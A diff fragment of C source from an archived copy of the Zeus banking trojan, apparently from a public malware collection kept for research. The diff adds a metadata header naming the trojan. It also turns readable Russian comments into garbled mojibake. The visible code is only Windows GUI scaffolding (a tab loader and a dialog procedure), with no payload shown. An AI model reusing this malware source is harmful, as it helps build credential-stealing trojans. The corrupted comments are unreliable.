@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <commctrl.h>
 #include <ole2.h>
@@ -51,10 +62,10 @@ static BYTE lastTool         = 0xFF;
 #define toolsCount (sizeof(toolsList) / sizeof(TOOLDATA))
 
 /*
-  Загрузка вкладки.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN hwnd  - родитель.
-  IN index - индекс вкладки.
+  IN hwnd  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN index - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void loadTool(HWND hwnd, BYTE index)
 {
@@ -70,7 +81,7 @@ static void loadTool(HWND hwnd, BYTE index)
 }
 
 /*
-  Функция главного окна.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 */
 static INT_PTR CALLBACK mainDialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
